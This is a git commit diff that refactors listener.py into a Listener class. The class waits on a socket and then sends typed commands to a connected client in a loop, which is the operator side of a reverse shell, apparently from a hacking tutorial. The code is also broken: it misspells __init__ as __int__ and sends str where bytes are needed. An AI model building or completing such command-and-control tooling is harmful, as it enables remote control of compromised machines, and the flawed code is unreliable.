a1d779e2e27ada629d23564a19bd0ca289a0f726
wizardxxdx <wizardxd@icloud.com>
2022-09-03 19:21:51 -0700

    CHE

--- listener.py
+++ listener.py
@@ -3,10 +3,19 @@
 import socket
 
 
-listener = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-listener.setsockopt(socket.SOCK_STREAM, socket.SO_REUSEADDR, 1)
-listener.bind(("localhost", 4444))
-listener.listen(0)
-print("[+] Waiting for incoming connection")
-listener.accept()
-print("[+] Got a connection")
+class Listener:
+    def __int__(self, ip, port):
+        listener = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+        listener.setsockopt(socket.SOCK_STREAM, socket.SO_REUSEADDR, 1)
+        listener.bind((ip, port))
+        listener.listen(0)
+        print("[+] Waiting for incoming connection")
+        self.connection, address = listener.accept()
+        print(f"[+] Got a connection from {str(address)}")
+
+    def run(self):
+        while True:
+            command = input(">> ")
+            self.connection.send(command)
+            result = self.connection.recv(1024)
+            print(result)
